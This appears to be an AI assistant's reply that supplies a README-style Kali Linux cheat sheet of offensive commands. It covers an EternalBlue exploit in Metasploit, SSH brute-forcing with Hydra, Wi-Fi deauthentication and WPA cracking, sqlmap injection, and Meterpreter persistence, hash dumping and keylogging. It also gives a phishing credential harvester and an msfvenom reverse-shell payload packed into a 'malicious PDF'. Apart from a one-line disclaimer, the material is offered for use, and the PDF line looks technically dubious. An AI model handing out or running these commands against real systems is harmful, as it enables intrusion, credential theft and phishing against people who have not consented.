Sure! Here’s a **README.md** file containing a collection of useful Kali Linux commands for hacking, penetration testing, and cybersecurity.  

---

# **Kali Linux Cheat Sheet for Hacking & Cybersecurity**  

## **Introduction**  
This document provides a list of essential Kali Linux commands used for penetration testing, ethical hacking, and cybersecurity. These commands cover network scanning, exploitation, password cracking, and more.

---

## **Table of Contents**  
1. [System Information & Management](#system-information--management)  
2. [Network Scanning & Reconnaissance](#network-scanning--reconnaissance)  
3. [Exploitation & Vulnerability Scanning](#exploitation--vulnerability-scanning)  
4. [Password Cracking](#password-cracking)  
5. [Wireless Attacks](#wireless-attacks)  
6. [Web Application Hacking](#web-application-hacking)  
7. [Post-Exploitation](#post-exploitation)  
8. [Forensics & Stealth Techniques](#forensics--stealth-techniques)  
9. [Social Engineering](#social-engineering)  

---

## **1. System Information & Management**  

```bash
# Check system information  
uname -a  

# Display current user  
whoami  

# List all users  
cat /etc/passwd  

# Check kernel version  
uname -r  

# Show running processes  
ps aux  

# Show network connections  
netstat -tulnp  

# View system logs  
cat /var/log/syslog  
```

---

## **2. Network Scanning & Reconnaissance**  

```bash
# Scan network for live hosts  
nmap -sn 192.168.1.0/24  

# Scan for open ports  
nmap -p- 192.168.1.1  

# Perform aggressive scan (OS detection, version detection, script scanning)  
nmap -A 192.168.1.1  

# Scan for vulnerabilities  
nmap --script vuln 192.168.1.1  

# Capture network traffic  
tcpdump -i eth0  

# Display ARP table  
arp -a  
```

---

## **3. Exploitation & Vulnerability Scanning**  

```bash
# Start Metasploit Framework  
msfconsole  

# Search for exploits  
search exploit windows/smb  

# Use an exploit  
use exploit/windows/smb/ms17_010_eternalblue  

# Set target IP  
set RHOSTS 192.168.1.100  

# Run exploit  
exploit  

# Scan vulnerabilities with Nikto  
nikto -h http://target.com  
```

---

## **4. Password Cracking**  

```bash
# Crack hashes using John the Ripper  
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt  

# Brute-force SSH login with Hydra  
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100  

# Crack password hashes with Hashcat  
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt  
```

---

## **5. Wireless Attacks**  

```bash
# Enable monitor mode  
airmon-ng start wlan0  

# Scan for Wi-Fi networks  
airodump-ng wlan0mon  

# Capture packets for WPA cracking  
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon  

# Perform deauthentication attack  
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon  

# Crack WPA handshake with Aircrack-ng  
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture.cap  
```

---

## **6. Web Application Hacking**  

```bash
# Scan website for vulnerabilities with SQLmap  
sqlmap -u "http://target.com/login.php?id=1" --dbs  

# Check for XSS vulnerabilities  
xsser -u "http://target.com/search.php?q="  

# Run directory brute-force with Gobuster  
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt  
```

---

## **7. Post-Exploitation**  

```bash
# Get system shell  
shell  

# Dump password hashes in Windows  
hashdump  

# Maintain access with a persistent backdoor  
persistence -U -i 30 -p 4444 -r  

# Capture keystrokes  
keyscan_start  

# Retrieve stored Wi-Fi passwords  
netsh wlan show profile name="WiFiName" key=clear  
```

---

## **8. Forensics & Stealth Techniques**  

```bash
# Extract metadata from a file  
exiftool image.jpg  

# Hide a file inside an image (Steganography)  
steghide embed -cf image.jpg -ef secret.txt  

# Search for deleted files  
foremost -i disk.img -o output/  

# Analyze memory dump  
volatility -f memory.dmp --profile=Win10x64 pslist  
```

---

## **9. Social Engineering**  

```bash
# Generate a phishing page with Social Engineering Toolkit (SET)  
setoolkit  

# Clone a website for phishing  
setoolkit -> Social-Engineering Attacks -> Website Attack Vectors -> Credential Harvester  

# Create a malicious PDF  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f pdf > exploit.pdf  
```

---

## **Disclaimer**  
This repository is for **educational purposes only**. Unauthorized use of these tools may be **illegal**. Always ensure you have **proper authorization** before performing penetration tests.  

---

Let me know if you need more commands or modifications! 🚀
